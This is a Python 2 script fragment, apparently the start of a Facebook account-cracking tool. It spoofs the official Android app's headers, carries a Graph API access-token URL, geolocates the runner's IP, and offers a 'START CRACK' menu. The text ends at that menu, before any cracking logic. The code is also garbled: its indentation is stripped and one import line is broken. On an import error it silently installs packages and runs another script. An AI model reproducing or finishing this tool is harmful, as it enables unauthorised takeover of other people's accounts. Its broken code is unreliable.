try:
os
import sys
import time
import platform
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
import requests
import uuid
import string
import subprocess
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
except ImportError:
os.system('pip2 install requests lolcat')
os.system('python2 riski.py')

from os import system
from time import sleep

def xox(z):
for e in z + '\n':
sys.stdout.write(e)
sys.stdout.flush()
time.sleep(0.04)


user_agent = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)',
'https://graph.facebook.com/100045203855294/subscribers?access_token=']
useragent_url = user_agent[2]
header = {
'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
'x-fb-sim-hni': str(random.randint(20000, 40000)),
'x-fb-net-hni': str(random.randint(20000, 40000)),
'x-fb-connection-quality': 'EXCELLENT',
'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-http-engine': 'Liger' }

try:
requests.get('https://www.google.com/search?q=Azim+Vau')
requests.get('https://m.youtube.com/results?search_query=Azim+Vau+Mr.+Error')
except requests.exceptions.ConnectionError:
os.system('clear')
xox('\n\t\x1b[93;1m NO INTERNET CONNECTION :(\n\n')
sys.exit()

ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers = {
'Referer': 'https://ip-api.com/',
'Content-Type': 'application/json; charset=utf-8',
'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36' }).json()['country_name'].upper()

def linex():
os.system('echo "\n ======================================\n" | lolcat -a -d 2 -s 50')


def logo():
os.system('echo "\n _ _ ___ ______ _____ \n | | | | / _ \\ | ___ \\_ _|\n | |_| |/ /_\\ \\| |_/ / | | \n | _ || _ || / | | \n | | | || | | || |\\ \\ _| |_ \n \\_| |_/\\_| |_/\\_| \\_|\\___/ \n ###############################\n # TOOL NAME: { MUHMAND } #\n # AUTHOR : MR. HARI #\n # GITHUB : git.io/AS #\n ###############################" | lolcat -a -d 2 -s 50')


def main():
os.system('clear')
logo()
print '\t\x1b[93;1m MAIN MENU\x1b[0m'
print ''
print '\x1b[92;1m [1] START CRACK'
print '\x1b[93;1m [2] HOW TO GET ACCESS TOKEN'
